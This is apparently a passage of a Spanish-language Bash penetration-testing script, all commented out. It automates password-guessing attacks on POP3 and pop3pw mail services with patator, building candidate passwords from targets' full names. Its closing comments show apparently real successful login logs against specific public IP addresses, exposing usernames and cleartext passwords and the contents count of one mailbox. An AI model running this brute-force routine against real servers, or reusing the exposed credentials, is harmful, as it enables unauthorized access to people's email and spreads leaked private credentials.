# 			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
# 			username=`tail -1 passwords2.txt` # dtorres
# 			echo -e "\n\t[+] username $username"			
# 			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
# 			grep --color=never messages logs/cracking/"$ip"_pop-$username.txt >> .vulnerabilidades/"$ip"_pop_passwordAdivinadoServ.txt
# 			echo ""					
# 			rm passwords.txt passwords2.txt passwords3.txt			
# 			echo "Dormir 5 min"
# 			sleep 300;
# 		done					
# 		echo ""			
# 	 done
# 	 insert_data
# 	fi # if bruteforce
# fi
	

# if [ -f servicios/pop3pw.txt ]
# then
# 	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
# 	read bruteforce	  
	  
# 	if [ $bruteforce == 's' ]
#     then     			
#       echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
# 	  read users_file  	  
	  
# 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
# 	  for line in $(cat servicios/pop3pw.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"	
# 		for fullname in $(cat $users_file); do
# 			echo -e "\n\t########### Testing fullname $fullname #######"			
# 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
# 			head -1 passwords2.txt > base.txt # solo primer nombre
# 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
# 			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
# 			username=`tail -1 passwords2.txt` # dtorres
# 			echo -e "\n\t[+] username $username"			
# 			patator.py pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
# 			grep --color=never "new password " logs/cracking/"$ip"_pop3pw-$username.txt >> .vulnerabilidades/"$ip"_pop3pw_passwordAdivinadoServ.txt
# 			echo ""					
# 			rm passwords.txt passwords2.txt passwords3.txt			
# 			echo "Dormir 5 min"
# 			sleep 300;
# 		done					
# 		echo ""			
# 	 done
# 	 insert_data
# 	fi # if bruteforce
# fi	



#patator.py pop_login host=181.115.239.243 user=msanti password='Bichito$9'
#17:20:24 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 17:20 EDT
#17:20:24 patator.py    INFO -                                                                              
#17:20:24 patator.py    INFO - code  size   time | candidate                          |   num | mesg
#17:20:24 patator.py    INFO - -----------------------------------------------------------------------------
#17:20:25 patator.py    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)


#patator.py pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
#16:40:34 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 16:40 EDT
#16:40:34 patator.py    INFO -                                                                              
##16:40:34 patator.py    INFO - code  size   time | candidate                          |   num | mesg
#16:40:34 patator.py    INFO - -----------------------------------------------------------------------------
#16:40:34 patator.py    INFO - 200   25    0.127 |                                    |     1 | Your new password please
